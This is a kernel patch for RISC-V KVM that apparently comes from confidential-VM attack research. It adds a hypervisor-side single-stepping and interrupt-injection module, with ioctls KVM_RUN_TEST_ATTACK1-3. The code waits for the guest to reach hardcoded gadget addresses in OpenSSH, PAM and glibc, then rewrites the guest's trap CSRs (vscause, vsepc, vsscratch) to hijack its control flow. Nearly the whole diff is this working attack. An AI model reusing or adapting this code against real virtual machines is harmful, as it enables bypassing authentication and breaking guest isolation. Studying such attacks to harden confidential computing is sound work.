@@ -1,0 +1,793 @@
+diff --git a/linux/arch/riscv/include/asm/kvm_host.h b/linux/arch/riscv/include/asm/kvm_host.h
+index d56351246..5e9a355c1 100644
+--- a/linux/arch/riscv/include/asm/kvm_host.h
++++ b/linux/arch/riscv/include/asm/kvm_host.h
+@@ -21,6 +21,7 @@
+ #include <asm/kvm_vcpu_sbi.h>
+ #include <asm/kvm_vcpu_timer.h>
+ #include <asm/kvm_vcpu_pmu.h>
++#include <cvm/iie-singlestep.h>
+ 
+ #define KVM_MAX_VCPUS			1024
+ 
+@@ -215,6 +216,9 @@ struct kvm_vcpu_arch {
+ 	/* VCPU Timer */
+ 	struct kvm_vcpu_timer timer;
+ 
++	/* Single Step Timer */
++	struct single_step_timer sstimer;
++
+ 	/* HFENCE request queue */
+ 	spinlock_t hfence_lock;
+ 	unsigned long hfence_head;
+diff --git a/linux/arch/riscv/include/cvm/iie-singlestep.h b/linux/arch/riscv/include/cvm/iie-singlestep.h
+new file mode 100644
+index 000000000..b4c3f8b32
+--- /dev/null
++++ b/linux/arch/riscv/include/cvm/iie-singlestep.h
+@@ -0,0 +1,112 @@
++#ifndef __ASM_RISCV_CVM_IIE_SINGLESTEP_H
++#define __ASM_RISCV_CVM_IIE_SINGLESTEP_H
++
++#include <linux/hrtimer.h>
++
++//#define FIRST_TIME_VALUE 20000
++#define FIRST_TIME_VALUE 50000
++#define MAX_TIME_VALUE 100000
++#define STEP_TIME_VALUE 100
++
++#define CAUSE_M_TIMER 0x8000000000000007
++
++#define INSTCMP_ZERO 0
++#define INSTCMP_SINGLE 4
++//#define INSTCMP_MAX 1000
++#define ZERO_STEP_THRESHOLD 1
++
++typedef enum {
++	CLOSE = 0,
++	INJECT_READY,
++	CONTROL_READY,
++	END
++} inject_state;
++
++typedef enum {
++	DIRECT = 0,
++	CYCLE,
++	ADDRESS
++} activation_mode;
++
++//Attack test
++#define KERNELADDR_SHIFT 32
++#define KERNELADDR_MATCH 0xffffffff
++#define OPENSSH_GADGET_ADDR 0x10838
++#define PAM_GADGET_ADDR 0x1089C
++#define GLIBC_GADGET_ADDR 0x106ae
++#define GLIBC_GADGET2_ADDR 0x106e2
++
++#define P1_MINADDR_SKIP 0
++#define P1_MAXADDR_SKIP 126
++#define P2_MINADDR_SKIP 0
++#define P2_MAXADDR_SKIP 118
++#define P3_MINADDR_SKIP 4
++#define P3_MAXADDR_SKIP 130
++
++#define P2_VSEPC_SKIP 8
++#define P3_VSSCRATCH_SKIP 840
++
++typedef enum {
++	NONE = 0,
++	OPENSSH,
++	PAM,
++	GLIBC
++} target;
++//End
++
++typedef struct {
++	int zero_step_count;
++	int zero_step_total;
++	int single_step_total;
++	int multi_step_total;
++} step_count;
++
++typedef struct {
++	bool activation;
++	bool waiting;
++	bool enabled;
++	bool stop_vstimer;
++	bool flush_tlb;
++	u64 time_value;
++	unsigned long last_instaddr;
++	target test_target;
++	step_count step_count;
++} single_step;
++
++struct single_step_timer {
++	/* Flag for whether init is done */
++	bool init_done;
++	/* Flag for whether timer event is configured */
++	bool next_set;
++
++	bool enabled;
++	/* Next timer event time */
++	u64 next_time;
++	/* Underlying hrtimer instance */
++	struct hrtimer hrt;
++
++	/* Flag to check if sstc is enabled or not */
++	bool sstc_enabled;
++	/* A function pointer to switch between stimecmp or hrtimer at runtime */
++	int (*timer_next_event)(struct kvm_vcpu *vcpu, u64 time);
++};
++
++
++extern single_step single_step_cfg;
++int single_step_timer_start(struct kvm_vcpu *vcpu);
++void single_step_flush_tlb(struct kvm_vcpu *vcpu);
++int step_counts(struct kvm_cpu_trap *trap);
++int calculate_instruction_counts(struct kvm_cpu_trap *trap);
++void vcpu_exit_moniter(struct kvm_cpu_trap *trap);
++inject_state intr_injecting_ready(inject_state inject, unsigned long sepc);
++inject_state intr_injecting(inject_state inject, struct kvm_vcpu *vcpu, unsigned long sepc);
++inject_state intr_control(inject_state inject, struct kvm_cpu_trap *trap);
++void single_step_enabled(bool enabled);
++void single_step_activation(bool activation);
++bool judge_condition(struct kvm_vcpu *vcpu, activation_mode mode, unsigned long addr);
++int single_step_init_activation(struct kvm_vcpu *vcpu);
++int single_step_stop_vstimer(struct kvm_cpu_trap *trap);
++
++int single_step_timer_init(struct kvm_vcpu *vcpu);
++
++#endif /* __ASM_RISCV_CVM_IIE_SINGLESTEP_H */
+\ No newline at end of file
+diff --git a/linux/arch/riscv/kvm/Makefile b/linux/arch/riscv/kvm/Makefile
+index 92229036d..91350db2c 100644
+--- a/linux/arch/riscv/kvm/Makefile
++++ b/linux/arch/riscv/kvm/Makefile
+@@ -32,3 +32,4 @@ kvm-y += aia.o
+ kvm-y += aia_device.o
+ kvm-y += aia_aplic.o
+ kvm-y += aia_imsic.o
++kvm-y += single_step.o
+diff --git a/linux/arch/riscv/kvm/single_step.c b/linux/arch/riscv/kvm/single_step.c
+new file mode 100644
+index 000000000..cacd4e3eb
+--- /dev/null
++++ b/linux/arch/riscv/kvm/single_step.c
+@@ -0,0 +1,400 @@
++#include <linux/errno.h>
++#include <linux/kvm_host.h>
++#include <linux/delay.h>
++#include <asm/csr.h>
++#include <asm/kvm_vcpu_timer.h>
++#include <cvm/iie-singlestep.h>
++
++single_step single_step_cfg = {
++	.activation = false,
++    .enabled = false,
++    .waiting = false,
++	.stop_vstimer = false,
++	.flush_tlb = false,
++    .time_value = 0,
++	.last_instaddr = 0,
++	.test_target = NONE,
++	.step_count = {0, 0, 0, 0}
++};
++EXPORT_SYMBOL(single_step_cfg);
++
++static int __single_step_activation(bool activation)
++{
++	single_step_cfg.activation = activation;
++	return 0;
++}
++
++static int __single_step_enabled(bool enabled)
++{
++	single_step_cfg.enabled = enabled;
++	return 0;
++}
++
++static bool __is_kernel_addr(unsigned long addr)
++{
++	return (addr >> KERNELADDR_SHIFT) == KERNELADDR_MATCH;
++}
++
++static bool __judge_condition(struct kvm_vcpu *vcpu, activation_mode mode, unsigned long addr)
++{
++	//Todo
++	struct kvm_guest_timer *gt = &vcpu->kvm->arch.timer;
++	u64 cycles_now = get_cycles64() + gt->time_delta;
++
++	if(mode == DIRECT){
++		printk(KERN_INFO "[IIE SingleStep Monitor@%s] Direct mode activation\n", __func__);
++		return true;
++	}
++	else if((mode == CYCLE) && (cycles_now >> 29 == 0x1)){
++		printk(KERN_INFO "[IIE SingleStep Monitor@%s] Cycle mode activation, cycle:%lu\n", __func__, cycles_now);
++		return true;
++	}
++	else if((mode == ADDRESS) && (!__is_kernel_addr(addr))){
++		printk(KERN_INFO "[IIE SingleStep Monitor@%s] Address mode activation, address:%lu\n", __func__, addr);
++		return true;
++	}
++	else{
++		return false;
++	}
++	return false;
++}
++
++bool judge_condition(struct kvm_vcpu *vcpu, activation_mode mode, unsigned long addr){
++	if(single_step_cfg.activation){
++		return false;
++	}
++	if(single_step_cfg.test_target == NONE){
++		return __judge_condition(vcpu, mode, addr);
++	}
++	else if(single_step_cfg.enabled == true){
++		return __judge_condition(vcpu, DIRECT, addr);
++	}
++	else{
++		return false;
++	}
++}
++EXPORT_SYMBOL_GPL(judge_condition);
++
++void single_step_enabled(bool enabled)
++{
++	__single_step_enabled(enabled);
++	printk(KERN_INFO "[IIE SingleStep Monitor@%s] Single step %s\n", __func__, enabled ? "enabled" : "disabled");
++}
++EXPORT_SYMBOL_GPL(single_step_enabled);
++
++void single_step_activation(bool activation)
++{
++	__single_step_activation(activation);
++	printk(KERN_INFO "[IIE SingleStep Monitor@%s] Single step %s\n", __func__, activation ? "activated" : "deactivated");
++}
++EXPORT_SYMBOL_GPL(single_step_activation);
++
++int single_step_init_activation(struct kvm_vcpu *vcpu)
++{
++	struct single_step_timer *sst = &vcpu->arch.sstimer;
++	single_step_cfg.time_value = FIRST_TIME_VALUE;
++	__single_step_activation(true);
++	sst->enabled = true;
++	single_step_cfg.flush_tlb = true;
++	printk(KERN_INFO "[IIE SingleStep Monitor@%s] Single step start, activation: %d\n", __func__, single_step_cfg.activation);
++	return 1;
++}
++EXPORT_SYMBOL_GPL(single_step_init_activation);
++
++void single_step_flush_tlb(struct kvm_vcpu *vcpu)
++{
++	unsigned long vmid;
++	vmid = READ_ONCE(vcpu->kvm->arch.vmid.vmid);
++	kvm_riscv_local_hfence_gvma_vmid_all(vmid);
++}
++EXPORT_SYMBOL_GPL(single_step_flush_tlb);
++
++int single_step_stop_vstimer(struct kvm_cpu_trap *trap)
++{
++	if(!__is_kernel_addr(trap->sepc)){
++		single_step_cfg.stop_vstimer = true;
++		return 1;
++	}
++	return 0;
++}
++EXPORT_SYMBOL_GPL(single_step_stop_vstimer);
++
++void vcpu_exit_moniter(struct kvm_cpu_trap *trap)
++{
++    unsigned long vstvec, vscause, vstval, vsscratch, vsepc;
++    vstvec = csr_read(CSR_VSTVEC);
++	vscause = csr_read(CSR_VSCAUSE);
++	vstval = csr_read(CSR_VSTVAL);
++	vsscratch = csr_read(CSR_VSSCRATCH);
++	vsepc = csr_read(CSR_VSEPC);
++	/*
++	if(trap->scause == 0x000000000000000C){
++        if((trap->sepc >> 32) != 0xffffffff){
++			printk(KERN_INFO ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" \
++				"vstvec: 0x%llx, vscause: 0x%llx, vstval: 0x%llx, vsscratch: 0x%llx, vsepc: 0x%llx" \
++				"mcause: 0x%llx, mtval: 0x%llx, mtval2: 0x%llx, mtinst: 0x%llx, mepc: 0x%llx\n", 
++				vstvec, vscause, vstval, vsscratch, vsepc, trap->scause, trap->stval, trap->htval, trap->htinst, trap->sepc);
++		}
++	}
++	*/
++	if(trap->scause == CAUSE_M_TIMER){
++        if(!__is_kernel_addr(trap->sepc)){
++			printk(KERN_INFO "[IIE SingleStep Monitor@%s] >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n" \
++				"vstvec: 0x%llx, vscause: 0x%llx, vstval: 0x%llx, vsscratch: 0x%llx, vsepc: 0x%llx\n" \
++				"mcause: 0x%llx, mtval: 0x%llx, mtval2: 0x%llx, mtinst: 0x%llx, mepc: 0x%llx\n", 
++				__func__, vstvec, vscause, vstval, vsscratch, vsepc, trap->scause, trap->stval, trap->htval, trap->htinst, trap->sepc);
++		}
++        
++        //printk(KERN_INFO ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");
++		//printk(KERN_INFO "vstvec: 0x%llx, vscause: 0x%llx, vstval: 0x%llx, vsscratch: 0x%llx, vsepc: 0x%llx\n", vstvec, vscause, vstval, vsscratch, vsepc);
++		//printk(KERN_INFO "mcause: 0x%llx, mtval: 0x%llx, mtval2: 0x%llx, mtinst: 0x%llx, mepc: 0x%llx\n", trap->scause, trap->stval, trap->htval, trap->htinst, trap->sepc);
++
++	}
++}
++EXPORT_SYMBOL_GPL(vcpu_exit_moniter);
++
++inject_state intr_injecting_ready(inject_state inject, unsigned long sepc)
++{
++	if(inject != CLOSE)
++		return inject;
++
++	switch(single_step_cfg.test_target){
++		case OPENSSH:
++			inject = (sepc == OPENSSH_GADGET_ADDR) ? INJECT_READY : CLOSE;
++			break;
++		case PAM:
++			inject = (sepc == PAM_GADGET_ADDR) ? INJECT_READY : CLOSE;
++			break;
++		case GLIBC:
++			inject = ((sepc == GLIBC_GADGET_ADDR) || (sepc == GLIBC_GADGET2_ADDR)) ? INJECT_READY : CLOSE;
++			break;
++		default:
++			inject = CLOSE;
++	}
++	return inject;
++}
++
++inject_state intr_injecting(inject_state inject, struct kvm_vcpu *vcpu, unsigned long sepc)
++{
++	if(inject != INJECT_READY)
++		return inject;
++
++	struct kvm_vcpu_csr *csr = &vcpu->arch.guest_csr;
++	unsigned long val = IRQ_VS_TIMER;
++	csr->hvip |= val;
++	__single_step_enabled(true);
++	printk(KERN_INFO "[IIE SingleStep Monitor@%s] Trap injected, sepc: 0x%lx\n", __func__, sepc);
++	return CONTROL_READY;
++}
++EXPORT_SYMBOL_GPL(intr_injecting);
++
++inject_state intr_control(inject_state inject, struct kvm_cpu_trap *trap)
++{
++	if((!single_step_cfg.activation) || (inject != CONTROL_READY))
++		return inject;
++
++	unsigned long minaddr_skip;
++	unsigned long maxaddr_skip;
++	unsigned long vscause = EXC_SYSCALL;
++	unsigned long vsepc = csr_read(CSR_VSEPC);
++	unsigned long vsscratch = csr_read(CSR_VSSCRATCH);
++	unsigned long vstveccmp = trap->sepc - csr_read(CSR_VSTVEC);
++	switch(single_step_cfg.test_target){
++		case OPENSSH:
++			minaddr_skip = P1_MINADDR_SKIP;
++			maxaddr_skip = P1_MAXADDR_SKIP;
++			break;
++		case PAM:
++			minaddr_skip = P2_MINADDR_SKIP;
++			maxaddr_skip = P2_MAXADDR_SKIP;
++			vsepc += P2_VSEPC_SKIP;
++			break;
++		case GLIBC:
++			minaddr_skip = P3_MINADDR_SKIP;
++			maxaddr_skip = P3_MAXADDR_SKIP;
++			if(vsepc == GLIBC_GADGET_ADDR){
++				vsscratch -= P3_VSSCRATCH_SKIP;
++			}
++			else if(vsepc == GLIBC_GADGET2_ADDR){
++				vsscratch += P3_VSSCRATCH_SKIP;
++			}
++			break;
++		default:
++			return inject;
++	}
++	if(!__is_kernel_addr(trap->sepc)){
++		calculate_instruction_counts(trap);
++		printk(KERN_INFO "[IIE SingleStep Monitor@%s] Not enter kernel! time_value: 0x%lx, sepc: 0x%lx\n",__func__, single_step_cfg.time_value, trap->sepc);
++		inject = CONTROL_READY;
++	}
++	else if(vstveccmp < minaddr_skip){
++		calculate_instruction_counts(trap);
++		printk(KERN_INFO "[IIE SingleStep Monitor@%s] Not arrive the attack point! time_value: 0x%lx, sepc: 0x%lx\n",__func__, single_step_cfg.time_value, trap->sepc);
++		inject = CONTROL_READY;
++	}
++	else if(vstveccmp > maxaddr_skip){
++		printk(KERN_INFO "[IIE SingleStep Monitor@%s] Miss the attack point! sepc: 0x%lx\n",__func__, trap->sepc);
++		inject = END;
++	}
++	else{
++		csr_write(CSR_VSCAUSE, vscause);
++		csr_write(CSR_VSEPC, vsepc);
++		csr_write(CSR_VSSCRATCH, vsscratch);
++		printk(KERN_INFO "[IIE SingleStep Monitor@%s] Succeed! sepc: 0x%lx\n", __func__, trap->sepc);
++		printk(KERN_INFO "[IIE SingleStep Monitor@%s] Succeed! vscause: 0x%lx\n", __func__, vscause);
++		printk(KERN_INFO "[IIE SingleStep Monitor@%s] Succeed! vsepc: 0x%lx\n", __func__, vsepc);
++		printk(KERN_INFO "[IIE SingleStep Monitor@%s] Succeed! vsscratch: 0x%lx\n", __func__, vsscratch);
++		inject = END;
++	}
++	if(inject == END){
++		__single_step_enabled(false);
++		__single_step_activation(false);
++	}
++	return inject;
++}
++EXPORT_SYMBOL_GPL(intr_control);
++/*
++inject_state intr_control(struct kvm_cpu_trap *trap, unsigned long cause, int skip_step)
++{
++	unsigned long vstvec = csr_read(CSR_VSTVEC);
++	unsigned long vsepc = csr_read(CSR_VSEPC) + 4 * skip_step;
++	unsigned long vstveccmp = trap->sepc - vstvec;
++	if(!__is_kernel_addr(trap->sepc)){
++		calculate_instruction_counts(trap);
++		printk(KERN_INFO "[IIE SingleStep Monitor@%s] Time error! time_value: 0x%lx, sepc: 0x%lx\n",__func__, single_step_cfg.time_value, trap->sepc);
++		return CONTROL_READY;
++	}
++	else if(vstveccmp > TRAP_MAX_SKIP){
++		printk(KERN_INFO "[IIE SingleStep Monitor@%s] Fail! sepc: 0x%lx\n",__func__, trap->sepc);
++		return END;
++	}
++	else{
++		csr_write(CSR_VSCAUSE, cause);
++		csr_write(CSR_VSEPC, vsepc);
++		printk(KERN_INFO "[IIE SingleStep Monitor@%s] Succeed! sepc: 0x%lx\n", __func__, trap->sepc);
++		printk(KERN_INFO "[IIE SingleStep Monitor@%s] Succeed! vsepc: 0x%lx\n", __func__, vsepc);
++		return END;
++	}
++}
++EXPORT_SYMBOL_GPL(intr_control);
++*/
++
++int calculate_instruction_counts(struct kvm_cpu_trap *trap)
++{
++	int instcmp;
++	if(trap->scause != CAUSE_M_TIMER){
++		return 0;
++	}
++	if(!single_step_cfg.last_instaddr){
++		single_step_cfg.last_instaddr = trap->sepc;
++		return 0;
++	}
++
++	instcmp = trap->sepc - single_step_cfg.last_instaddr;
++
++    if(instcmp == INSTCMP_ZERO){
++		single_step_cfg.step_count.zero_step_count += 1;
++		single_step_cfg.step_count.zero_step_total += 1;
++		if((single_step_cfg.time_value < MAX_TIME_VALUE) && (single_step_cfg.step_count.zero_step_count > ZERO_STEP_THRESHOLD)){
++			single_step_cfg.step_count.zero_step_count = 0;
++			single_step_cfg.time_value += STEP_TIME_VALUE;
++		}
++		printk(KERN_INFO "[IIE SingleStep Monitor@%s] Instcmp = 0, time_value: %llx", __func__, single_step_cfg.time_value);
++	}
++	else if(__is_kernel_addr(trap->sepc) || __is_kernel_addr(single_step_cfg.last_instaddr)){
++		//printk(KERN_INFO "[IIE SingleStep Monitor@%s] Kernel address, Instcmp = %d", __func__, instcmp);
++	}
++	else if(instcmp == INSTCMP_SINGLE){
++		single_step_cfg.step_count.single_step_total += 1;
++		printk(KERN_INFO "[IIE SingleStep Monitor@%s] Instcmp = 1, time_value: %llx", __func__, single_step_cfg.time_value);
++	}
++	else if(instcmp > INSTCMP_SINGLE){
++		single_step_cfg.step_count.multi_step_total += 1;
++		if(single_step_cfg.time_value > STEP_TIME_VALUE){
++			single_step_cfg.time_value -= STEP_TIME_VALUE;
++		}
++		printk(KERN_INFO "[IIE SingleStep Monitor@%s] Instcmp = %d, time_value: %llx", __func__, instcmp, single_step_cfg.time_value);
++	}
++	single_step_cfg.last_instaddr = trap->sepc;
++	return 0;
++}
++EXPORT_SYMBOL_GPL(calculate_instruction_counts);
++
++int step_counts(struct kvm_cpu_trap *trap)
++{
++	if(trap->scause != CAUSE_M_TIMER){
++		return 0;
++	}
++	if(__is_kernel_addr(trap->sepc)){
++		return 0;
++	}
++	printk(KERN_INFO "[IIE SingleStep Monitor@%s] time_value: %lu, zero_step_total: %d, single_step_total: %d, multi_step_total: %d", 
++		__func__, single_step_cfg.time_value, single_step_cfg.step_count.zero_step_total, single_step_cfg.step_count.single_step_total, single_step_cfg.step_count.multi_step_total);
++	return 1;
++}
++EXPORT_SYMBOL_GPL(step_counts);
++
++int single_step_timer_start(struct kvm_vcpu *vcpu)
++{
++    struct single_step_timer *sst = &vcpu->arch.sstimer;
++	//struct kvm_guest_timer *gt = &vcpu->kvm->arch.timer;
++	//u64 cycles_now = get_cycles64() + gt->time_delta;
++	//printk(KERN_INFO "[IIE CVM Monitor] cycles_now: %llx", cycles_now);
++	if(sst->enabled){
++		sst->enabled = false;
++		return sst->timer_next_event(vcpu, single_step_cfg.time_value);
++	}
++	return 0;
++}
++EXPORT_SYMBOL_GPL(single_step_timer_start);
++
++static enum hrtimer_restart single_step_hrtimer_expired(struct hrtimer *h)
++{
++	struct single_step_timer *sst = container_of(h, struct single_step_timer, hrt);
++	sst->next_set = false;
++	sst->enabled = true;
++	udelay(1000);
++	//printk(KERN_INFO "hrtimer_end, %lx", single_step_cfg.stop_vstimer);
++	return HRTIMER_NORESTART;
++}
++
++static int single_step_update_hrtimer(struct kvm_vcpu *vcpu, u64 time)
++{
++	struct single_step_timer *sst = &vcpu->arch.sstimer;
++
++	if (!sst->init_done)
++		return -EINVAL;
++
++	sst->next_time = time;
++	hrtimer_start(&sst->hrt, ktime_set(0, time), HRTIMER_MODE_REL);
++	sst->next_set = true;
++	//printk(KERN_INFO "hrtimer_start, sepc: %llx\n", single_step_cfg.last_instaddr);
++
++	return 0;
++}
++
++int single_step_timer_init(struct kvm_vcpu *vcpu)
++{
++	struct single_step_timer *sst = &vcpu->arch.sstimer;
++
++	if (sst->init_done)
++		return -EINVAL;
++
++	hrtimer_init(&sst->hrt, CLOCK_MONOTONIC, HRTIMER_MODE_REL);
++	sst->init_done = true;
++	sst->next_set = false;
++	sst->enabled = false;
++
++	/* Enable sstc for every vcpu if available in hardware */
++	if (riscv_isa_extension_available(NULL, SSTC)) {
++		sst->sstc_enabled = true;
++		//todo
++	} else {
++		sst->sstc_enabled = false;
++		sst->hrt.function = single_step_hrtimer_expired;
++		sst->timer_next_event = single_step_update_hrtimer;
++	}
++
++	return 0;
++}
++EXPORT_SYMBOL_GPL(single_step_timer_init);
+\ No newline at end of file
+diff --git a/linux/arch/riscv/kvm/vcpu.c b/linux/arch/riscv/kvm/vcpu.c
+index 8ebc2e10c..c699a9628 100644
+--- a/linux/arch/riscv/kvm/vcpu.c
++++ b/linux/arch/riscv/kvm/vcpu.c
+@@ -21,6 +21,7 @@
+ #include <asm/cacheflush.h>
+ #include <asm/kvm_vcpu_vector.h>
+ #include <cvm/iie-cvm-sbi.h>
++#include <cvm/iie-singlestep.h>
+ #include <asm/pgtable-bits.h>
+ #include <asm/page.h>
+ #include <linux/of.h>
+@@ -138,6 +139,9 @@ int kvm_arch_vcpu_create(struct kvm_vcpu *vcpu)
+ 	/* Setup VCPU timer */
+ 	kvm_riscv_vcpu_timer_init(vcpu);
+ 
++	/* iie. Setup single step timer */
++	single_step_timer_init(vcpu);
++
+ 	/* setup performance monitoring */
+ 	kvm_riscv_vcpu_pmu_init(vcpu);
+ 
+@@ -654,6 +658,7 @@ int kvm_arch_vcpu_ioctl_run(struct kvm_vcpu *vcpu)
+ 	struct kvm_cpu_trap *trap = kmalloc(sizeof(struct kvm_cpu_trap), GFP_KERNEL);
+ 	struct kvm_run *run = vcpu->run;
+ 	struct iie_cvm_sbi_params *cvm_sbi_params = kmalloc(sizeof(struct iie_cvm_sbi_params), GFP_KERNEL);
++	inject_state inject = CLOSE;
+ 
+ 	sbi_ret.error = 0;
+ 	cvm_sbi_params->vmid_ptr = __pa(&vcpu->kvm->arch.vmid);
+@@ -782,10 +787,28 @@ int kvm_arch_vcpu_ioctl_run(struct kvm_vcpu *vcpu)
+ 				}
+ 			}
+ 			// #endif
+-
++			//iie 
++			if (judge_condition(vcpu, CYCLE, trap->sepc)){
++				single_step_init_activation(vcpu);
++			}
++			if (single_step_cfg.activation) {
++				single_step_timer_start(vcpu);
++				//single_step_flush_tlb(vcpu);
++			}
+ 			// #ifdef PROG_BYK
+ 			sbi_ret = sbi_ecall(SBI_EXT_CVM, SBI_EXT_CVM_RUN_VCPU, __pa(cvm_sbi_params),
+ 				__pa(&vcpu->arch.guest_context), __pa(&vcpu->arch.guest_csr), __pa(trap), 0, 0);
++			
++			if (single_step_cfg.activation && (single_step_cfg.test_target == NONE)){
++				vcpu_exit_moniter(trap);
++				calculate_instruction_counts(trap);
++				step_counts(trap);
++			}
++			
++			inject = intr_injecting_ready(inject, trap->sepc);
++			inject = intr_injecting(inject, vcpu, trap->sepc);
++			inject = intr_control(inject, trap);
++
+ 			// #endif
+ 		}
+ 		
+@@ -813,6 +836,11 @@ int kvm_arch_vcpu_ioctl_run(struct kvm_vcpu *vcpu)
+ 			trap->htval = csr_read(CSR_HTVAL);
+ 			trap->htinst = csr_read(CSR_HTINST);
+ 			// #endif
++			/* //iie debug
++			if(trap->scause == 0x8000000000000005){
++				printk(KERN_INFO "scause: 0x%llx, stval: 0x%llx, htval2: 0x%llx, htinst: 0x%llx, sepc: 0x%llx\n", trap->scause, trap->stval, trap->htval, trap->htinst, trap->sepc);
++			}
++			*/
+ 		}
+ 
+ 		/* Syncup interrupts state with HW */
+diff --git a/linux/arch/riscv/kvm/vcpu_exit.c b/linux/arch/riscv/kvm/vcpu_exit.c
+index 2415722c0..33585b9a3 100644
+--- a/linux/arch/riscv/kvm/vcpu_exit.c
++++ b/linux/arch/riscv/kvm/vcpu_exit.c
+@@ -20,6 +20,8 @@ static int gstage_page_fault(struct kvm_vcpu *vcpu, struct kvm_run *run,
+ 	int ret;
+ 
+ 	fault_addr = (trap->htval << 2) | (trap->stval & 0x3);
++
++	//printk(KERN_INFO "fault_addr: %llx\n", fault_addr);
+ 	gfn = fault_addr >> PAGE_SHIFT;
+ 	memslot = gfn_to_memslot(vcpu->kvm, gfn);
+ 	hva = gfn_to_hva_memslot_prot(memslot, gfn, &writable);
+@@ -39,7 +41,6 @@ static int gstage_page_fault(struct kvm_vcpu *vcpu, struct kvm_run *run,
+ 			return -EOPNOTSUPP;
+ 		};
+ 	}
+-
+ 	ret = kvm_riscv_gstage_map(vcpu, memslot, fault_addr, hva,
+ 		(trap->scause == EXC_STORE_GUEST_PAGE_FAULT) ? true : false);
+ 	if (ret < 0)
+@@ -163,6 +164,9 @@ void kvm_riscv_vcpu_trap_redirect(struct kvm_vcpu *vcpu,
+ 
+ 	/* Set Guest privilege mode to supervisor */
+ 	vcpu->arch.guest_context.sstatus |= SR_SPP;
++
++	printk(KERN_INFO "Redirecting trap to Guest: sepc=0x%lx, scause=0x%lx, stval=0x%lx, vsepc=0x%lx\n",
++	       vcpu->arch.guest_context.sepc, trap->scause, trap->stval, trap->sepc);
+ }
+ 
+ /*
+diff --git a/linux/arch/riscv/kvm/vcpu_timer.c b/linux/arch/riscv/kvm/vcpu_timer.c
+index 75486b25a..827270dfa 100644
+--- a/linux/arch/riscv/kvm/vcpu_timer.c
++++ b/linux/arch/riscv/kvm/vcpu_timer.c
+@@ -14,6 +14,7 @@
+ #include <asm/csr.h>
+ #include <asm/delay.h>
+ #include <asm/kvm_vcpu_timer.h>
++#include <cvm/iie-singlestep.h>
+ 
+ static u64 kvm_riscv_current_cycles(struct kvm_guest_timer *gt)
+ {
+@@ -102,7 +103,11 @@ static int kvm_riscv_vcpu_update_hrtimer(struct kvm_vcpu *vcpu, u64 ncycles)
+ int kvm_riscv_vcpu_timer_next_event(struct kvm_vcpu *vcpu, u64 ncycles)
+ {
+ 	struct kvm_vcpu_timer *t = &vcpu->arch.timer;
+-
++	// singlestep
++	// if singlestep is enabled, close vs-mode timer interrupt;
++	if (single_step_cfg.stop_vstimer) {
++		//return 0;
++	}
+ 	return t->timer_next_event(vcpu, ncycles);
+ }
+ 
+diff --git a/linux/include/uapi/linux/kvm.h b/linux/include/uapi/linux/kvm.h
+index 25266614c..fb41f2979 100644
+--- a/linux/include/uapi/linux/kvm.h
++++ b/linux/include/uapi/linux/kvm.h
+@@ -1585,6 +1585,9 @@ struct kvm_s390_ucas_mapping {
+ /*
+  * ioctls for vcpu fds
+  */
++#define KVM_RUN_TEST_ATTACK3	  _IO(KVMIO,  0x7d)
++#define KVM_RUN_TEST_ATTACK1	  _IO(KVMIO,  0x7e)
++#define KVM_RUN_TEST_ATTACK2	  _IO(KVMIO,  0x7f)
+ #define KVM_RUN                   _IO(KVMIO,   0x80)
+ #define KVM_GET_REGS              _IOR(KVMIO,  0x81, struct kvm_regs)
+ #define KVM_SET_REGS              _IOW(KVMIO,  0x82, struct kvm_regs)
+diff --git a/linux/virt/kvm/kvm_main.c b/linux/virt/kvm/kvm_main.c
+index e4af6e77c..d36fc0db4 100644
+--- a/linux/virt/kvm/kvm_main.c
++++ b/linux/virt/kvm/kvm_main.c
+@@ -70,6 +70,7 @@
+ #include <linux/kvm_dirty_ring.h>
+ 
+ #include <cvm/iie-cvm-sbi.h>
++#include <cvm/iie-singlestep.h>
+ 
+ /* Worst case buffer size needed for holding an integer. */
+ #define ITOA_MAX_LEN 12
+@@ -4186,6 +4187,81 @@ static long kvm_vcpu_ioctl(struct file *filp,
+ 	if (mutex_lock_killable(&vcpu->mutex))
+ 		return -EINTR;
+ 	switch (ioctl) {
++	case KVM_RUN_TEST_ATTACK1: {
++		struct pid *oldpid;
++		single_step_cfg.test_target = OPENSSH;
++		r = -EINVAL;
++		if (arg)
++			goto out;
++		oldpid = rcu_access_pointer(vcpu->pid);
++		if (unlikely(oldpid != task_pid(current))) {
++			/* The thread running this VCPU changed. */
++			struct pid *newpid;
++
++			r = kvm_arch_vcpu_run_pid_change(vcpu);
++			if (r)
++				break;
++
++			newpid = get_task_pid(current, PIDTYPE_PID);
++			rcu_assign_pointer(vcpu->pid, newpid);
++			if (oldpid)
++				synchronize_rcu();
++			put_pid(oldpid);
++		}
++		r = kvm_arch_vcpu_ioctl_run(vcpu);
++		trace_kvm_userspace_exit(vcpu->run->exit_reason, r);
++		break;
++	}
++	case KVM_RUN_TEST_ATTACK2: {
++		struct pid *oldpid;
++		single_step_cfg.test_target = PAM;
++		r = -EINVAL;
++		if (arg)
++			goto out;
++		oldpid = rcu_access_pointer(vcpu->pid);
++		if (unlikely(oldpid != task_pid(current))) {
++			/* The thread running this VCPU changed. */
++			struct pid *newpid;
++
++			r = kvm_arch_vcpu_run_pid_change(vcpu);
++			if (r)
++				break;
++
++			newpid = get_task_pid(current, PIDTYPE_PID);
++			rcu_assign_pointer(vcpu->pid, newpid);
++			if (oldpid)
++				synchronize_rcu();
++			put_pid(oldpid);
++		}
++		r = kvm_arch_vcpu_ioctl_run(vcpu);
++		trace_kvm_userspace_exit(vcpu->run->exit_reason, r);
++		break;
++	}
++	case KVM_RUN_TEST_ATTACK3: {
++		struct pid *oldpid;
++		single_step_cfg.test_target = GLIBC;
++		r = -EINVAL;
++		if (arg)
++			goto out;
++		oldpid = rcu_access_pointer(vcpu->pid);
++		if (unlikely(oldpid != task_pid(current))) {
++			/* The thread running this VCPU changed. */
++			struct pid *newpid;
++
++			r = kvm_arch_vcpu_run_pid_change(vcpu);
++			if (r)
++				break;
++
++			newpid = get_task_pid(current, PIDTYPE_PID);
++			rcu_assign_pointer(vcpu->pid, newpid);
++			if (oldpid)
++				synchronize_rcu();
++			put_pid(oldpid);
++		}
++		r = kvm_arch_vcpu_ioctl_run(vcpu);
++		trace_kvm_userspace_exit(vcpu->run->exit_reason, r);
++		break;
++	}
+ 	case KVM_RUN: {
+ 		struct pid *oldpid;
+ 		r = -EINVAL;
